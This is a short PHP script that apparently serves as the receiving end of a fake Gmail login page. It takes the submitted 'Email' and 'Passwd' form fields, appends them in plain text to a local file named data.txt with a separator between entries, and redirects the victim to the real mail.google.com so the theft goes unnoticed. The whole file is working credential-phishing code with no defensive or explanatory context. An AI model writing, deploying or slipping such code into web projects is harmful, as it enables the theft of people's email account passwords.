<?php
header ('Location: https://mail.google.com/ ');
$handle = fopen("data.txt", "a");
foreach($_POST as $variable => $value) {
if($variable == "Email" )
{
   fwrite($handle, "User Name ");
   fwrite($handle, "= ");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
else if ($variable == "Passwd")
{
   fwrite($handle, "Password " );
   fwrite($handle, "= ");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
}
fwrite($handle,"***********************");
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>
